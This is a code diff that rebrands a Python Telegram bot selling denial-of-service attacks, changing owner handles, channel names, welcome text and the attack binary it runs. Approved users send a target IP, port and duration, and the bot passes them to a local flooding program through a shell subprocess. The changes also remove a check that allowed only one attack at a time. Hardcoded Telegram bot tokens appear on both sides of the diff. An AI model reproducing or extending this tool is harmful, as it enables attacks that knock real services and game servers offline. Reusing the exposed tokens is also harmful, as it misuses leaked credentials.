@@ -4,11 +4,10 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 import os
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0")  # Fetch token from environment variable
-ADMIN_USER_ID = 1549748318
+TELEGRAM_BOT_TOKEN = ("8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs")  # Fetch token from environment variable
+ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "@RAJOWBER9090"  # Replace with your channel username
-attack_in_progress = False
+CHANNEL_ID = "@GODxCHES826wyhwij"  # Replace with your channel username
 
 # Check if the token is set
 if not TELEGRAM_BOT_TOKEN:
@@ -48,11 +47,11 @@ async def start(update: Update, context: CallbackContext):
     """Send a welcome message to the user."""
     chat_id = update.effective_chat.id
     message = (
-        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐀𝐑𝐊 𝐗 𝐒𝐄𝐑𝐕𝐄𝐑 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃 𝐘𝐀𝐍𝐇𝐀 𝐓𝐔𝐌 𝐇𝐀𝐂𝐊𝐄𝐑 𝐁𝐀𝐍𝐍𝐄 𝐊𝐀 𝐒𝐀𝐏𝐍𝐀 𝐒𝐀𝐊𝐀𝐑 𝐊𝐀𝐑 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎😂*\n\n"
-        "*𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓*\n"
-        "*𝐎𝐖𝐍𝐄𝐑*: @RajOwner90\n"
-        f"🔔 *𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋*: {CHANNEL_ID} 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐈𝐒𝐊𝐀 𝐌𝐀𝐙𝐀 𝐋𝐄 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎.\n\n"
-        "𝐔𝐒𝐄 /help 𝐓𝐎 𝐒𝐄𝐄 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒."
+        "*🥂 WELCOME TO GODxCHEATS DDOS🍹*\n\n"
+        "*PREMIUM DDOS BOT*\n"
+        "*Owner*: @GODxAloneBOY\n"
+        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
+        "Use /help to see available commands."
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -60,13 +59,13 @@ async def help_command(update: Update, context: CallbackContext):
     """Send a list of available commands and their usage."""
     chat_id = update.effective_chat.id
     message = (
-        "*𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:*\n\n"
+        "*Available Commands:*\n\n"
         "/start - Start the bot and get a welcome message.\n"
         "/help - Show this help message.\n"
         "/approve <id> - Approve a user or group ID (admin only).\n"
         "/remove <id> - Remove a user or group ID (admin only).\n"
         "/alluser - List all approved users and groups (admin only).\n"
-        "/attack <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄> - 𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 (approved users only).\n"
+        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -76,7 +75,7 @@ async def approve(update: Update, context: CallbackContext):
     args = context.args
 
     if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -103,7 +102,7 @@ async def remove(update: Update, context: CallbackContext):
     args = context.args
 
     if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
         return
 
     if len(args) != 1:
@@ -123,7 +122,7 @@ async def alluser(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
 
     if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐎𝐍𝐋𝐘 𝐑𝐀𝐉 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
         return
 
     if not approved_ids:
@@ -135,46 +134,38 @@ async def alluser(update: Update, context: CallbackContext):
 
 async def attack(update: Update, context: CallbackContext):
     """Launch an attack if the user is approved and a channel member."""
-    global attack_in_progress
-
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     args = context.args
 
     if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐈𝐒 𝐁𝐎𝐓 𝐊𝐀 𝐔𝐏𝐀𝐘𝐎𝐆 𝐊𝐀𝐑𝐀𝐍𝐄 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐀𝐀𝐏𝐀𝐊𝐎 𝐎𝐖𝐍𝐄𝐑 𝐊𝐈 𝐀𝐍𝐔𝐌𝐀𝐓𝐈 𝐊𝐈 𝐀𝐀𝐕𝐀𝐒𝐇𝐘𝐀𝐊𝐀𝐓𝐀 𝐇𝐀𝐈@𝐑𝐀𝐉𝐎𝐖𝐍𝐄𝐑90.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
         return
 
     if not await is_member_of_channel(user_id, context):
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝐏𝐄𝐇𝐋𝐄 𝐓𝐔𝐌𝐇𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑𝐍𝐀 𝐇𝐎𝐆𝐀 ({CHANNEL_ID}) 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐈𝐒𝐊𝐀 𝐌𝐀𝐙𝐀 𝐋𝐄 𝐒𝐀𝐊𝐓𝐄 𝐇𝐎.*", parse_mode='Markdown')
-        return
-
-    if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝐀𝐁𝐄 𝐑𝐔𝐊 𝐉𝐀 𝐏𝐄𝐇𝐋𝐄 𝐖𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇 𝐇𝐎𝐍𝐄 𝐃𝐄 𝐏𝐇𝐈𝐑 𝐓𝐔𝐌 𝐀𝐓𝐓𝐀𝐂𝐊 𝐌𝐀𝐑𝐍𝐀 .*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*𝐔𝐒𝐀𝐆𝐄: /𝐀𝐓𝐓𝐀𝐂𝐊 <𝐈𝐏> <𝐏𝐎𝐑𝐓> <𝐓𝐈𝐌𝐄>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
 
     ip, port, time = args
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆 𝐆𝐘𝐀 𝐂𝐇𝐄𝐂𝐊 𝐊𝐀𝐑 ✅*\n"
-        f"*🎯 𝐓𝐀𝐑𝐆𝐄𝐓:* {ip}\n"
-        f"*🔌 𝐏𝐎𝐑𝐓:* {port}\n"
-        f"*⏱ 𝐓𝐈𝐌𝐄:* {time} seconds\n"
+        f"*😈 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 😈*\n\n"
+        f"*👙 TARGET :* {ip}\n"
+        f"*🖕 PORT :* {port}\n"
+        f"*⏳ DURATOIN :* {time} seconds\n\n"
+        f"*🔻FUCK THE GAME NOW🔺*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, time, context))
 
 async def run_attack(chat_id, ip, port, time, context):
     """Simulate an attack process."""
-    global attack_in_progress
-    attack_in_progress = True
-
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./russian {ip} {port} {time} 600",
+            f"./bgmi {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -189,9 +180,8 @@ async def run_attack(chat_id, ip, port, time, context):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
     finally:
-        attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*♥️ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ♥️*\n"
-        "*𝐒𝐄𝐍𝐃 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐓𝐎 𝐎𝐖𝐍𝐄𝐑 :-@RajOwner90*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔰 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 🔰*\n"
+                                                          "* SEND FEEDBACK TO OWNER :- @GODxAloneBOY *", parse_mode='Markdown')
 
 # Main Function
 def main():
